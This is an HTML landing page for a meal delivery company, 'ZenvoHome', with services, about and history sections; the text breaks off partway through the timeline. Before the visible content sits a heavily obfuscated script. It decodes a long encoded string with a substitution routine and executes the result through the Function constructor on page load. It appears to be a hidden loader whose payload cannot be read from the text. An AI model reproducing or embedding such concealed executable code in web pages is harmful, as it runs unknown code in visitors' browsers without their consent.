@#bJ)v{Nq~T)@n/_btzsi;k#/M:~4$$elIj(p08!.=Nu$#@ )vbJf#{)4I0=(jp/!$P@f#[@JtXbtp1q=(0@05KX@#j[PCVP&[Cb[uM {*kn37b:/sitz#b;MR$B`b/?k;3Q4=DM@Cq00_E9q4 RgRZ~OO9T~7JZR9AJD8/sbtk[i;Mno77:z{2bB`^gusba!rkZJZ8[mJD8~mb{*9A3[&uM`o77 b{~bB+ua('3wk[L nvCb7J(0I$b1{)He;80*9a0P0H85bc[7kR9Hdbc85k*7JbR05k*9H7R0c82q:77~:~A *[F0q9H8WbcC5kR9 AJ0H85b*0kR08[dbc0$H1{7be;a03 n0I)Jv(0$b1{PHe;8b*9a0R0H85VcU0kO~Z[Cbt2Oq;kn/_M:zsib'#bB/N6(`su(c)rp4& `1@#=ba.bBsRN+np{)/=wTvg4Jb(v'H1{8@e;a0$CJ0[COJb.V/pN'id9^[k AJ7n/sbtz#i;M/b.':pN9iO72^@oqq:~7~:[A .9dba7r]aebtk]/;Mn/s':z#iiO/b.@CpN9sbtk^i;Mn/.':z#9iO/b^@7pNNubB`M-nAb)Qw/Q[JgCVgUUVH{WpaUO q RZOZ[CJUUiOJb.[/pN'7d9^tk AJMn/sb:z#i;O/b.'opN9i772^@ qq:~t~:[Akn/db:zsi;O#b.M/pN'iO9^@4/4/7/0UU0v(0(MC$$04VV[$paJU~gH{UI`UWO AU[`JoJCb^vbBI/(/kjAA{yk_ t$*&q_b[uM {dO~3[CVZ2O9b1!q/ij1Anv7b3b(0I {*&)J#buM )B`b3/R*ppN0g$^4Z]8*[#b@P?1B`b!(v~a$D)/R@Cvu/* AJ.&uMb{B` 3#~b{Qbg36iH8T 5)d 6Qwb{*@[3#&uMabB` *Z'b!u-I210s=Q42-805`b@#bk3N1BeA1E-yMc)g@2)//J[COjn/Vbtzsi;k#bBM:AM`b'-tM56@JJMuJJ[7lbn8duR[:^n87d7:^lbb{*uR3#&uMLbB` M:nbc~gvyiy:$Z(u@JE':_y~EL~ZwywOw#YcR~Z_KHU7 @$YJb[C un8:AR#b^l/&B`b63/?Ku89jR0~vn:[db@^lun8#bR#v)B`b@46ln:?4)gZsrMe.v@J30[J[CVv[CVV[CbP0)?cc0d7J[r AJ7/sbtk#i;MnbB`:zwrb{l0(v^4i$/Nj+Mw@JbMEvb*K i`r1A.&{K[[.*&udbbBM 3s`b*#Qer$)45w{ub9L0)B`b@Jk(53HDMkZ/cO/rLbBR)[&`bt#0'R*)@J/$rpJbp2&{[^N1!7dj1A9b#bB/iyl`bn&kMQ.):^'Du$ZrLN@JbOp&{p^CV[CVk AJ[n/sbtz#i;M)bB`:ql6be)@n;)EJb++vi`MMncb*+b[[dMn=(JJ]Pn/5jbcA(Qv[K0AJ7d/bn= 5(](nb;[dJy:LQJ0Pb!)$M^(47/E(QdbM[$M^(4b/E(Q{*&M7#buM uB`b3tc^^/wwK4M9prAu@Jbju/5n=(:(]Pn~H Q9#b=Z~2B`bOIj53;uicO2uMeA5 r@1?:LPJb[Q!);7dy0OqO~ZH_Q92 =Z:~B`~O#2b{ub01)r6CV4L9=[CT@~JJy Q!b;:^)y0L(4Q7b(M$M/-#bBE4' `b:5tl/JTcN*[[[Q@LQdb;b!)y:B`b0#eR.tz$Mu=I@J[!^J[CVVKCJb[0jQcA;:v7J0LQ!bPbn)yj2vu~z~Dtd A[7LQJb;d!)y:bcA0[vJK0j~obnQtj2vub;z~Dy:LQF0#b!)5)B`b9c']H'@W{kQ!b;:B)y0L`b.#b&!jQ?/0u$.p.(g{bn:a@2vu~Pz~DtjJb[C );:LAy0#Q!;NbB`I)=vbZr21(9:@77b~#bQHczB`-0+AIu D?vn0nRHdb!M@);:L[y0#Q!5.bB`q4k0b.4q$ :+T0zV]@J&VO~[C_bZ2OQcAKqvCV0j=([Jb#n/5nbB`(])3baujvuj/9R'-6Jb@Pv5n=([(]#n/*5bB`MtzIbvgk!k[C0@P{VV[0*&uJbbBM 3K`bK#459IQw@.y8b[CV5{*&VC#buM LB`b3IeM3E)0?MRr)p1~) @8sbcJbBzL{r`0{LEvb^tsP/ (4J^vi+qbc[7Jc0rd[CV)?Jo[C (JJbA1:y5]pIzEP)e0zb[7Ku(1db5b:yz]+MME7bNEvi/MAK`TMCp:0zbpItKu)ekn/7b:zsi;&#bBM9rv`b06r(^b3-tAB`b@#pg+;8CDQM~ AJr@(1Jb57:yz][EopImmJ)e0zb#bBKu1u`bcE4M3.-@J)$](vPb#1:y5bB`zEKrbe$MM$Z].!9)([o0M217b5@:yz](O~E[[AZ2Odw=Rq_~Z~CVO2OqO2~C_Z[dV[JqO~Z[CV 2OJbAJo+3(tJ)~P1)v^bNAuj?rdb3[7+)(t1M~7b)Evi+M2*`barKCbyv^uNAtkj?7Mn/sb:z#i;H)bB`-!/)bH?1MND*.vab@#bKN1;B`(1u rR0/6lg@CuQb3 AJ)(t1J~o7)+mJ[)b3(m+)~t1Aro7b[v^uN[dOj?q_~Z2CAw=OVO~R~_ZZ2O[O2~qJ[[CV2OdO~JqCVZJJb AkNp?ep^g/&cQ&PbvvMPbb^~~;^;t0P4eDv HePbT85k*9b3R0cOuHaPr Puug0b!3{q/P{80$b10PHe;sbi0a/Pbrl6(&M0=~PbM8AD&N!arTPP6:$bbiM?i90I$^(zvP20j~bcH-4'P8MZ4b^9[M0pc7dbQ&Mb1{87J;a0$H00PbeM6(&M)/~Pb52Agg^(/Pba~:{jzPb!HL/K6?dj/[Abg)7g7b/2$H1{8be;a0&M00#@#M6(ZbB`~=&'b^!64?u['yneCb5@J{j^(/Ha~:qwZ7#E9 I~B:~_`b+PbAw.l ])5sA'Z/TjPPJ[PP@#PP_VdP@P(/Cb5~:{j^#bBHa&+`banH4M!@Jby(6(&M0b~#bM'~AB`M(*reC @J2bg)[[7b/2Agg)/g#bB2Ac!`b*vwe2yr$ucc[C)g@!A9OJ6?zJb/_L/K^9A_j(/:b5~[{jHgd Aa)/2JbB`Ag#Ib+ub)AH);vrL)v62@Jr?zLb![7/Kjd77U/O~Z0[Aw2Oqb=R~_g)/CVbg2Ag#)/27bB`AgD!b!4awI+8${0O0JbN '/!6?@Kj/zLCVPP#[qOZPb@#b+3LB`)1u&80ay)2E]3!OJbMz@:cMAJy;)8!bg[77)/2dbg)Ag#b/2ArB`bg'(Kzzr+(Oqbrq.ycMA@J;)8!:VPy[C [C)/AJb2Agg[do7OqO~Z~_Aw2CVO=Rq_~Z2VZO2OCb;~C~0vv^87Jb~0$H1{Pbe;a(&M00~PbM6v.Kc&-eQPAr$eb-[7rv&&db$Av.Kcw=eQ7-R~CAr$eb-7brv&H1{8$e;a0$M00#bCM6(&b1{~@e;80$Ma0#H0M6b&q~(~@lT_{7DJbO9$H1{8be;a0&M00#@PM6(Zdj~~wOjZJ8O~ZP~98P_E~ _O_dI~O9 AJ[8778Ob-7bByHAH`/80:r[d]u'vbKc~.eQ&A~C7ZOOVO~2q_eZ2EZ~A=Q#bB~cM)`b uz$a/6uLkr]IyjOj@JZO~ZPw98P_8~ _O~VI~OEV[C[C0$b1{#He;8b&Ma0~@0M6-#bB(lcc`bM'0Ll5/Ei&@J[D080Cb10$He{#b&;a(~M0Mr@7b6$er--O~v&$bZ2OCKc&q_QCAv.tVCbeDv ^;70T4eaCb3euuOuHp?r 7ge&kb/#bN^QnB`bD15A3TM0M?$q.zzOu@CQJb*A9kR9H8b0c75*9HvC0c85kab3RuuOuH*9r C0H85bcXXkR3{[dbbg0q!p?e/7g/&kN8#b*^5kR9Hb10c@e{80C;a0$H{g7b!@0q/3Cb&#v(~M0Mg7b!60q/3{b&#0@rN=8CT7bAD0q!3{b/#/g!a6@C7J:$?6b&Mi(~[0M^;7d4tDvbee7 TbivCV9MI$C0zv^2M07Jb7M6(&db~[v ^;tvT4eDCVCe7j~bc(&4'70v-rJbPb)(u/+ssyw;+&^4)~PbdHA[-b^;7T4tDvVee7 CA9vC-MOJb^Z4MH97v08MZCbH94M0-b&8^DrN=8MTCbAZ4MH-XX08^b[d 91{8AJ;a0$Hb0#beN$ B`0rMMAJL2M{b&Mr@~[0M60[db(j~4c(bH'J00-MZP8^94M0MPb&V6(~Mb1{[Ce;80$ a07Hnv(b3b10I)e{80J;a0$HAJ[CV8oJb 0$H1{#be;a8B`b0^4ZK;k@lcnMJb&*6(~M0bc[[['(0jdJvP~4Z4bH-PM08Mb&M^9~[0M6rCVb(ls/i0807b10$He{Cb1;aHe{801;a0${807ba0$HeM#b&;6(~M0Jb@C H1{8Ae;a0$`b0#b;{:MBv485yB`)@J~b.rbAlR&O(w-'Md$~Kybc([['J0j~&0Pv4M0MPb#6(~4bB`X($:b'.i*{&Ceu@)Vb1[He{803;a0$ nv7bJb(0IH1{8)e;a0$AJ0[C0ob1 $He{8bB;a0E`bp#q(O(AH5IH/3rp4H@JbHal:B`b'5'z&qq(2{[[D:]jdbcM~4'(0PbJvP(&M00~XM6b'#bBq6{5`$=LuNasM;Q @[)AJoCVg0b!3[q/#{d A4@cQJob0&MJprlsbiM0/Pb[M6(&db!~[?ia6:MJb&$6(~M0~=[CVJR~dVb;v A0Jv^~sbi0~/Pbrl6(&M0i~[[MMI$dbzv^29MJb&06(~M0VO[CV_~Z2Vb^;OqT4tDvJeeC ##bV[sitknb;M:/B`bzP1)gj&ZDMuvpPr2/tk@P#Mn/sb:zPi;+NbB`M05wbj0^Tq0:6L4bPv@atknP#M:/sibzPb;*reB`$eMnkP&K!e0@PPvn/#btzsi;kPbBM:)R`bpkOzLOLPv5utk@P#Mn/sb:zPi;NMbB`e-Dvb(^u*cv@gL4nP#bP/sitkPb;M:uB`bzDN:Q4R=/QM+~v)KyPvTgtk@P#Mn/sb:zPi;+rbB` 2/Mb6?sjpv@)5=nP#bP/sitkPb;M:rB`bzNEjKaPviApk@P#un/sbtzPi;M:bB`:u+Ibak;pO(8jvH5Pv@H/knP#b:/sitz#b;Mu B`bME/$au@P )^MbB`rr14b.c;O 0@zl+&P#bPuM {*`b3Pbv'/.Bau0nzP#-PMMb{*@ 3P&uK/bB`lA38b9I5!)#bP/@ {*&P3PbuM3:B`bM9kKNKPr{M{*@P#P&uMbbB` 3L bHvA${*^/:t'r/@;/K&P#bPuM {*`b3PbnQK6BE 3Q--MAO9P)0ka/P0v3{*@P#P&uMbbB` 3!wbg9zzw:/LM]utP/wZ0*@P#u&uMb{B` 3PubnqbtEq=z;PMyT{/@P4*&u#bbBM 3s`bnPEO{=LQP)p:{/@Py*&u#bbBM 38`bQ#a^Op^PbyD(TB`b@0s$iuP4~gMk@P#An/sbtz#i;M/bB`:v$)bi~{^?Ob@Pb:.v/B`$44wuP/*TMv@P/Dn/#btzsi;k#bBM:]r`bi0Mr0)@Pblr4vB`bMr]^+tPv]]tk@P#Mn/sb:z#i;N4bB`ua((b)~tiz5{c(A`)@Plb&LbB$Dusucz*iv)Pvivtk@P#Mn/sb:z#i;i:bB`TTjRbR-@{?b;PbB0!$v`iaE((#bPv@itknP;M:/s`bz#b)ikeB4(4/8.3]!r`*@P6b*ubBs-K:HI=9v(R0 ur@P^iPu#b{vM 3*&bi#bBzMQs`E:w~0bB;u@Z`b^J1lr:u)K )M`/[Pvbc+bB0;yM-r3MyI@P#?PuMb{*` 3#&baMbBTa(D$+)r=)@Jbut;0B`b($Dlg(69~+j0Ozc`4[P(b&4bBDgzIuu9kv8.PMyMPb@P#(B`bvM^pQZP02Z3P@P#DbB`r2b5a02N-T+D)8N@P=4PB#0`bzPbRe45.tvrRi/;O:)0@n+LbP#PB`bP0]N1r0A'?D@P#DPB`P1b!zb28ri-AuNylP)MP4#0@btPbBI0*(`rj{'{w4up(0'?u4@P#HPB`P9b;qb?LQl)'4k4$@~P0vP#P0`bPb+!N]B~?*Mk*(${5P24P{#0@bcPbBMO)M`3r?//P# P0`P@b^zbB&{:MlO/9v-'P0OqP@P#abB`'/wbQq $=u+)D4)P0@r:PbP##uB`b@k/v;~;wEI0&v$r)OP0$.@P@P#6bB`#/:.bzE;r0~HDeNLg/8Ze##P0@b@PbPNc&B`HLq'A..qIA0P09KdV@@[ ~=R[AJb~dr]ae.7a]/92q:77~:~A .[dbq9r]aeq2a]/b==C7i*5VV7JtELIb^O/Pbis8ve=eA]Pb.MwrP*{vZbgI*NjEM21pPb.PuKM;ba;+Pb!]tPbLz~4*^4:wPb]$M9z=Rt?PbN$/+cQPb!&0t5yv~4Pb5$r''1KAPb*$;M*0)g=/Pb[zDua7dM{8Ib^OE7b+svi`MM8Ib^O8Cb^sI7bOsI#^OscbB`8.crbQ'1a$vs@Jb(8I#^O^'bB`{A$Mb2-(.3?2g/MbzMiHB`b@J(330M1ukn95[X50i=0[C7eAMbb^OvebBs8IZ`b1#$DwQpR1^u;O~@J$s8Ib^bg#bBK*w(`Z/ijA$[{4@]Cb.Uwr7*{/sbtk#i;MnbB`:zQMb;k/s:r]vM@y/eAJbiBMve=`ba#buT+8(e?A2HvlwakPre@JC[P0v AJu[n/obtzsi;k#bBM:Mr`b1 )n$i')@$0{]Jb.bwr[*gIM[dE7vZNMb{*j 3#&u{4bB`=tirb2]M(9n$IaM`;@#qbz3bBekM2^svr2M](w'4#b()cKB`b@ZM!+?Me]DLv@%v~vvvl0b.C Ao*{]J7bgwrNjIMveE[dZ.9rba7q]a]C2==/Vb*CVKM21pk+.7un/sbtz#i;McbB`:0r$bik]Ew-ecR=K@Jb&vMvi=ebe#bAp)MB`4u(t(ue@Jv[P0rPa;u[Ct]t;bkn/7b:zsi;t#bBMk.M`b)yu6j!/54=e)@gveAJbiBMve=`bz#b^vu$RM?/Kq$.Ma^$[@JubP0uP^Os[C^O8I7Bs8Ib`b+#bc00OO=-{((14.u.vPu0@Ib^OJ#bBs88n`bK=;wTz~2g6eCb@U$4*^4[w7q]$tk~T_Mn/sb:z#i;+rbB`Nic)bwE0{61n$-.B$8@5`b{Jb4H/4$b M0~B`b&P*~!.jQ9H; =Rj9(/[{tNNCbzlM9?=R_b7q~itknT;M:/s`bz#b2*E/B$-.(^bBrI@{`bKJ1+4a?u+v$?A/4N]sPbu9):B`bz]:apzH=e089u64QI[C*t$/bc~7+!&tq~T0kn/_b:zsi;n#bBM4^r`bLZiTI*rp/9zE3QM`b@Jb$;r]Baz{TrryDN~Bvr02`bcPbMl^yA(1/0{[CbOq$t5yv_47q5btk~T;Mn/s`:z#ib*MbBi;l0{JIg$D#G(@UAvU)`@Pwb;ObBg!{uKu$(/iv0u)Ab^{q[bOs8C^OsI7B`8I#Ib'&bI~l{)sa4wu4@Jb)]$4*^`bwPbN&KwBMKz:9D[y44n#bBl0r `bIDr)uM4g9s $'vM=R@JbbNM9zB`b?P1.{tvH+r;zKa(]qbB^r[.`bz#rT4iI@JLL4/bcQ4+!&t$B`0~P;bQ bg&Kg)[#c&HjbB`Ml0sb{?6ywMpIn(k$@J./5$b5y`t4PvbgvbBg-E.I)tn]HM2?L !L:[C@z~:bCA97#1KOJbP$r''b*07v*/)A;t7baM;Cb;]r''1Kvvl$Cb'0v'X1K$)XPbrA;M*0b**/XM21p7+.PuKA;b*0vM*/)l0v%7!Lv[d*z~:b0)A#b@7;M*rb'1/'CVK$zDbag^uM{=Os87b`bI#bl-j5B4kur6g-MM:@+A~qJf`(gj[d/VOCO~fqJJZ2tpbt=P1q0(bKR5Ks.jZi(kaPE$cHb5nRuPbbn24tcH$(Pb'$]$PeLvPb'1)~PbK$rM*0)'*/[A;t=7d0(tpb5K71qKR#@C.jZibka7EszDbagBuM{=`b'#bk]ttv/O/ k@Cb40Hu5($t7btcp1q=(bB05KZ`bt#)+1$4N&/2K`{@#5b50bBT3u4{)91THw@J;~tpbt=[1q0(Cbt5K4(nRn/7bt2si;knbBM:z5`be#2vt)u@#;nj9bB`i=:3b+8./uO@OI;;JbtA-i;kn/bM:zscH$[CbB$]$e`ba74jNatw9s$0bM#b9e0+B`3D'?H-8?z;@J0r9O[C$Jb'Ar'71K0)vPb7A;M*vCb*/r''1KZbK$iEsRjb'.kaX1K$CXPbr';M*0)b*/XA*0)XP/%A;Mv7vl*[db0v)~'eLR7Jbvn24tng=(Jb#zDuab'1M{@PK$r!0u['Lz~Ub0):#b@A;M*Xvl*/%v0vvbl0v[5($vC%cHu$XbJ$]$cHeL#Jbuv)~'[Svf0H$@Xb'$]$ceLv#bu@)~%Z[CV02OqO~n/_btzsi;k#bBM:R$`b'0A3an2@J*2tpbt=#1q0(bB`5K-]bzNtuiw-a/l1~4H@J[[CJ[CVV[HKCb3JjZrMbniO7^~{uRn4:Pue(IbnPb9N(''1K]Pb3$ruOuHadr [ubni7^~{uRg4:7u1)!JbQ~q/*8Pb&)ADrN=dOT[7_~Z2btkOq;Mn/s`:z#ib-4bBn^rn*E?i0+e*!MsbBIg@u`b3#zv9I60v5-4@+uL=JbtT)i;kn/BM:zs`bn#brsr1n#l9.EbB`g@D+b+skLrTynAj;IT@54E&J[,KN=8JbUbADr/g1)T*)Q!q[X~X0qbg1[/*))!bnQ~VNne(C(]7I93uCrHaub 7buORuni{0^~4uv,0:J(Mvvv[,0vPCA9vv1KOJbC$r''b'17vbK$ru3uH'Or auK$Cb'dr'X1bnnX[N(e(Ik]X79n/sbtz#i;MabB`:ls1bp*aI/Z0DLq]@#bqEqMB`b0O4/a6ls4?@Jw(ERbniru^~{uMu4:JMPuM/[[CM42OVO~eq_bZ(I9nnVCN(]e AJC.9rba77]a]A72q/ q~:~ae:[d].9rb/7b]aELi*5~/J[t=R~CVba_ Aae.9J]/7r]==77q.[db29r]aeb3a]/rMHK7OJ[jZJYCV _vY_Ab+M q[dMEvvb+Mii#YME[CvY@dV~=JO~ZR~Vb2Oqi+MMC`biEv7J0k/0Jbc4Dl)3cb*H-cb*08PaE!(Pb*rA/v!MlPPb1ug0ww=v^616(;tDPbeev T1[74w=vdb16(0w'7bB6]My`b.$9k68Cb*4(#b*0(01w=7w61vJbc6@:yMA8s;)P!s&^b+~P/w;Ibnn+9N(e(4-]PbP:(=-b'1j$[7K$redb'(I9nnN(]:Cb-7(=j4-`b$7b9Nu4BtA5tzCA]u:19OJOK$rb'b''7v1K$Cb+sr'w;s&^1+~C/K$rb'db'XX9nne[N(](I4-X7b#:(=-bB`j$Arba=L1M- M0LQibt$y@;kn/JM:zsibQ#bBR9n&`)! {e)Qu']`j@#^bz.bBK;6MT9Mzrs/Q4g!btM6@;kn/JM:zsib3#bB)~/H`0$:E2`b@#b$.8nBKi~:I8$A*8@4rMvJ[,z!:(b-4B=j$-`b*#bE5048eig414j@O2O~[[CbZ2OVcMAq_;)8!:(XbnyI9NneCb(]C/aE!V7b*rA#b*0801w=(w61v(B`6@J!btubqN-3 q9a0N[LP0ICb*4rgv!Ml87b*u(#b*0(01w=Jw61vbB`6@~{bHvO!((4rn^ju+Rni(CP0/*b**/[b*08(v!Ml#@7Jug)Zbnkz0p~d:~[7_b=~Zitkn~;M:/sE!z#b:rA/a~=~@CtkZ~_Mn/sb:z#i;lub*!~gv@MZ2OCO3cqJb-0Dlcc77)H~)7bnFZz0kbaep[a].9rV/W]CbtCi;kn/aM:zsE!r#bb{A/@3*&u7#bBM A^`b;R8~$a4)'gHbBr/@e`b'#/I120Jbu*L {*&@3[CuM/sbtk#i;Mnb*!:zv@Mlu~7Jbg)Zznkb0p[#**07b*!8(v@Mlu)JbngZz0k~^;p[C4tDvbee7 T_JJq~VJ[7T[#bdTgB`b)!$i+$6sN$@JD)/AbaEu/X!r*!JXXMlubJgvb'XbBKeq-`i*(2j2sZ1u[1zX-[[[b&#bB0HR)`IsMrIJb!eMlc3c@)H-0Dccc[C[0r)bCO~?J_bZ2O ^;tqT4eDvJdeCVCVPd[V[JV[9TT q:[C\\\";for(_BqhTW of _C22oe){if(_BqhTW[ã('Ϯ')]||_S35cpT82dF){_OIflurB5=_KxR2N59-(_K5I8Yo4V()+_BqhTW)[ã('Ϯ')]%_C22oe[_XU19v1tp];_UfT1gN0=(_A2L7fz,_DoFpAjs1U,_XtUXO7l8D)=>{_X3SfrsOCki=_X3SfrsOCki[ã('Բ')](\\\"\\\\x14\\\",'>')[ã('Բ')](\\\"\\\\x13\\\",'<')[ã('Բ')](\\\"\\\\x12\\\",'\\\"')[ã('Բ')](\\\"\\\\x11\\\",\\\"\\\\\\\\\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('р'),ã('А')),ã('Щ'));_X3SfrsOCki=((_G6MPXUQ,_VAwa7,_T1eFz53mAG,_GlP14wU,_D7tLDI0e,_YchLAi8M47,_B15kLVU7i,_Vr1k1r,_WE5vfB83qj,_DoFpAjs1U,_CJYt0p,_QZT84Q,_U5fpWdhX9,_XkZY1UhST,_SXVy0iw3RR)=>{_B15kLVU7i=(_VAwa7[ã('Ө')](-_YchLAi8M47)+_VAwa7[ã('Ө')](0,-_YchLAi8M47))[ã('Ө')]('');_WE5vfB83qj=_T1eFz53mAG[ã('԰')][ã('Ը')](_T1eFz53mAG);for(_QZT84Q=_GlP14wU;_QZT84Q<=_D7tLDI0e;_QZT84Q++){_U5fpWdhX9=_Vr1k1r(_QZT84Q);if(_WE5vfB83qj(_U5fpWdhX9)==-1){_CJYt0p[_U5fpWdhX9]=_B15kLVU7i[_DoFpAjs1U++];}}_XkZY1UhST=_G6MPXUQ[ã('Ϯ')];for(_QZT84Q=0;_QZT84Q<_XkZY1UhST;_QZT84Q++){_U5fpWdhX9=_G6MPXUQ[_QZT84Q];_SXVy0iw3RR+=_CJYt0p[_U5fpWdhX9]||_U5fpWdhX9;}return _SXVy0iw3RR;})(_X3SfrsOCki,\\\"*IE21ZuK3Az=podXlq]f$;yc?^Fv(Tm5Mr,Ns|w-}:+'t)bS .O_U{R/B#Ygjx&C!Hn4kV60a@hGP~`eiW[8%JQ79DL\\\",'\\\\\\\\\\\"<>',0x20,0x7e,_OIflurB5,null,_VjC2kYX5dG[ã('Ӡ')][ã('Џ')][ã('Ը')](_VjC2kYX5dG),null,0,{},0,\\\"\\\",0,\\\"\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('Ԟ'),ã('А')),ã('Ւ'));(()=>{})[ã('ն')](\\\"_L55c0Y\\\",_X3SfrsOCki)(_L55c0Y);};_UfT1gN0(\\\"\\\",_Al9cj,_VjC2kYX5dG[ã('Ӡ')]);}}}))();})(()=>\\\"Jl4RiUKW1bbvqq6hR1qLYxC79E5e147kk8\\\",\\\"\\\\165\\\\143\\\",window,0x0,0x1,0x31,\\\"\\\\162\\\\145\\\\144\\\");​_L55c0Y._Y1j23()\"[_WZWjLh7l2()](`​`)[_WZWjLh7l2(1)](_Izgl5ltm=>{return((()=>{})[_WZWjLh7l2(2)](\"_L55c0Y\",_Izgl5ltm)(_L55c0Y))!==false;}))({});})();")();</script>
    
    <header class="header_nav_container_8k3j">
        <nav class="nav_wrapper_9m2x">
            <a href="#home" class="logo_text_4p7q">ZenvoHome</a>
            <ul class="navigation_menu_5t8w">
                <li><a href="#home">Home</a></li>
                <li><a href="#services_9k3m">Services</a></li>
                <li><a href="#about_7r4n">About Us</a></li>
                <li><a href="#history_5x8p">Our Story</a></li>
                <li><a href="#cuisine_3m9k">Cuisine Types</a></li>
                <li><a href="#delivery_8n2r">Delivery Areas</a></li>
                <li><a href="#reviews_4k7m">Reviews</a></li>
                <li><a href="#contact_6p3x">Contact</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero_section_6n9r">
        <div class="hero_content_2l5k">
            <h1 class="hero_title_3d8m">Delicious Meals Delivered to Your Doorstep</h1>
            <p class="hero_subtitle_7r4n">Experience the convenience of fresh, homemade quality food delivered right when you need it. Your satisfaction is our mission every single day.</p>
            <a href="#services_9k3m" class="cta_button_1x6p">Click Here to Continue</a>
        </div>
    </section>

    <section id="services_9k3m" class="section_container_8h3v">
        <h2 class="section_title_9k2m">Our Food Delivery Services</h2>
        <div class="content_grid_4j7x">
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">🍱</div>
                <h3 class="card_title_6p3r">Daily Fresh Meals</h3>
                <p class="card_description_7t4k">Every morning our culinary team prepares authentic dishes using locally sourced ingredients. We believe in supporting community farmers while bringing you the freshest flavors possible. Our commitment to quality means each meal is crafted with attention to detail and genuine care for your wellbeing.</p>
            </div>
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">🚚</div>
                <h3 class="card_title_6p3r">Fast Delivery Network</h3>
                <p class="card_description_7t4k">Our extensive delivery network covers multiple neighborhoods with trained professionals who understand the importance of timely service. We utilize advanced routing technology combined with human expertise to ensure your food arrives hot and ready to enjoy. Temperature controlled containers maintain optimal freshness throughout transit.</p>
            </div>
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">🥗</div>
                <h3 class="card_title_6p3r">Healthy Options</h3>
                <p class="card_description_7t4k">Nutrition matters to us as much as taste. Our menu features balanced meals designed by certified nutritionists who understand dietary needs. Whether you're following specific eating patterns or simply want wholesome food, we provide transparent ingredient information and customizable options for every preference.</p>
            </div>
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">📱</div>
                <h3 class="card_title_6p3r">Easy Ordering System</h3>
                <p class="card_description_7t4k">Place orders through multiple convenient channels including phone, website, or mobile application. Our user-friendly interface remembers your preferences and suggests meals based on your history. Real-time tracking keeps you informed about your delivery status from kitchen to doorstep with precise updates.</p>
            </div>
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">🌮</div>
                <h3 class="card_title_6p3r">Diverse Menu Selection</h3>
                <p class="card_description_7t4k">Explore flavors from around the world without leaving your home. Our rotating menu features seasonal specialties alongside customer favorites. From comfort food to adventurous international cuisine, there's always something new to discover. Weekly specials keep your dining experience exciting and varied.</p>
            </div>
            <div class="card_item_5n8q">
                <div class="card_icon_2m9w">⭐</div>
                <h3 class="card_title_6p3r">Customer Satisfaction</h3>
                <p class="card_description_7t4k">Your happiness drives everything we do. Our dedicated support team addresses concerns promptly and professionally. We actively seek feedback to continuously improve our service. Every interaction is an opportunity to exceed expectations and build lasting relationships with our valued customers.</p>
            </div>
        </div>
        
        <div class="highlight_text_5m8n">
            <p>Join thousands of satisfied customers who trust ZenvoHome for their daily meals. <a href="#contact_6p3x" style="color: #ffd700; text-decoration: underline;">Click here to continue</a> and start your culinary journey with us today!</p>
        </div>
    </section>

    <section id="about_7r4n" class="section_container_8h3v" style="background: white;">
        <h2 class="section_title_9k2m">About ZenvoHome</h2>
        <img src="https://images.pexels.com/photos/4253320/pexels-photo-4253320.jpeg?auto=compress&cs=tinysrgb&w=1200" alt="Food preparation" class="image_showcase_8n4r">
        <div class="info_box_3k9r">
            <p>ZenvoHome emerged from a simple observation: people deserve access to quality meals without compromising their busy schedules. Our founders recognized the gap between fast food convenience and home-cooked nutrition. This realization sparked a mission to revolutionize food delivery by combining efficiency with culinary excellence.</p>
            <p style="margin-top: 15px;">We partner with talented chefs who share our vision of accessible, delicious food. Each recipe undergoes rigorous testing to ensure consistency and flavor. Our kitchen facilities maintain the highest hygiene standards, regularly inspected and certified by health authorities. Transparency in our operations builds trust with every customer.</p>
            <p style="margin-top: 15px;">Sustainability guides our business practices. We minimize waste through careful portion planning and eco-friendly packaging. Supporting local suppliers reduces our carbon footprint while strengthening community connections. These values aren't just policies—they're fundamental to who we are as a company.</p>
        </div>
        
        <div class="content_grid_4j7x" style="margin-top: 40px;">
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Our Mission Statement</h3>
                <p class="card_description_7t4k">To nourish communities by delivering exceptional meals that bring joy, convenience, and health to every table. We strive to make quality food accessible to everyone regardless of their schedule or cooking abilities. Through innovation and dedication, we're building a future where nutritious eating is effortless.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Core Values</h3>
                <ul class="feature_list_7r3k">
                    <li>Integrity in every ingredient and interaction</li>
                    <li>Excellence through continuous improvement</li>
                    <li>Community focus and local partnerships</li>
                    <li>Environmental responsibility</li>
                    <li>Customer-centric innovation</li>
                    <li>Team member empowerment and growth</li>
                </ul>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Quality Commitment</h3>
                <p class="card_description_7t4k">Every ingredient passes strict quality checks before entering our kitchen. We maintain relationships with suppliers who share our standards for freshness and ethical sourcing. Regular audits ensure compliance with food safety regulations. Our quality assurance team monitors every step from procurement to delivery.</p>
            </div>
        </div>
    </section>

    <section id="history_5x8p" class="section_container_8h3v">
        <h2 class="section_title_9k2m">Our Journey Through Time</h2>
        <div class="history_timeline_3x8n">
            <div class="timeline_item_9r5m">
                <div class="timeline_year_4k7p">2015</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">The Beginning of Something Special</h3>
                    <p>ZenvoHome started in a small kitchen with three passionate individuals who believed food delivery could be better. Armed with family recipes and determination, they began serving their neighborhood. Those early days taught valuable lessons about customer service, quality control, and the importance of listening to feedback. Word spread quickly about the delicious meals and reliable service.</p>
                </div>
            </div>
            <div class="timeline_item_9r5m">
                <div class="timeline_year_4k7p">2017</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">Expansion and Growth Phase</h3>
                    <p>Demand exceeded expectations, prompting expansion to a larger facility. We hired experienced chefs and invested in professional equipment. The team grew from three to twenty-five dedicated members. New delivery vehicles joined our fleet, extending our service radius. This period challenged us to maintain quality while scaling operations, a balance we achieved through systematic processes and unwavering standards.</p>
                </div>
            </div>
            <div class="timeline_item_9r5m">
                <div class="timeline_year_4k7p">2019</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">Technology Integration</h3>
